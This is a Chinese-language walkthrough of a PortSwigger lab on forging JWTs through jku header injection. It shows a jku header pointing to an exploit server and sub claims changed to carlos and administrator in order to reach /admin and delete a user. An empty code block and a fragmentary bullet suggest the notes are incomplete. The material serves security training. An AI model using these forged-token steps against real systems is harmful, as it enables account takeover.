# 实验：通过 jku 头部注入绕过 JWT 身份验证

本实验使用基于 JWT 的机制来处理会话。服务器支持 JWT 头部中的 `jku` 参数。然而，它在获取密钥之前未能检查所提供的 URL 是否属于受信任的域。

要解决本实验，请伪造一个 JWT，使您能够访问 `/admin` 下的管理面板，然后删除用户 `carlos`。

您可以使用以下凭据登录自己的账户：`wiener:peter`

> **提示**
>
> 我们建议在尝试本实验之前，先熟悉[如何在 Burp Suite 中使用 JWT](/burp/documentation/desktop/testing-workflow/vulnerabilities/session-management/jwts)。

        ```http

        ```
        - 但不设置也可成功

- 将请求发送到重复器，设置 JWT JKU 字段为攻击者端点

    ```json
    {
        "alg": "RS256",
        "jku": "https://exploit-id.exploit-server.net/exploit"
    }
    ```

- 使用对应的 RSA 密钥进行签名后发送到账户页面端点
    - 成功访问 wiener 账户页面

    - 修改 JWT 字段为 carlos

        ```json
        {
            "iss": "portswigger",
            "exp": 1786716971,
            "sub": "carlos"
        }
        ```
        - 成功访问目标用户账户页面

    - 修改 JWT 字段为管理员

        ```json
        {
            "alg": "RS256",
            "jku": "https://exploit-id.exploit-server.net/exploit"
        }
        {
            "iss": "portswigger",
            "exp": 1786716971,
            "sub": "administrator"
        }
        ```
        - 成功访问管理员账户页面

    - 设置管理员 JWT cookie 到浏览器，访问管理端点 `/admin` 使用删除功能
